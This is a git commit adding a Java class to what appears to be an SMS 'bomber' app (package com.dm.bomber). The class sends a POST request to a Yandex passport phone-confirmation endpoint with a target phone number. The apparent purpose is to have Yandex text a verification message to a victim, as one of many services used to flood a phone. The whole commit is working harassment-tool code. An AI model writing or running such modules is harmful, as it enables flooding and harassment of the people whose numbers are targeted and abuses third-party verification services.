f56adb089e15ef9a1dafe8d385a219ff9f7b4f3e
Marat Nedogimov <nedo.marat@yandex.ru>
2021-08-08 11:37:49 +0500

    update: added 5 services; fix: sephora

---
+++ app/src/main/java/com/dm/bomber/services/Yandex.java
@@ -0,0 +1,19 @@
+package com.dm.bomber.services;
+
+import okhttp3.FormBody;
+import okhttp3.Request;
+
+public class Yandex extends FormService {
+
+    public Yandex() {
+        setUrl("https://mobileproxy.passport.yandex.net/1/bundle/phone/confirm/submit");
+        setMethod(POST);
+    }
+
+
+    @Override
+    public void buildBody(FormBody.Builder builder) {
+        builder.add("number", "+" + getFormattedPhone());
+        builder.add("display_language", "ru");
+    }
+}
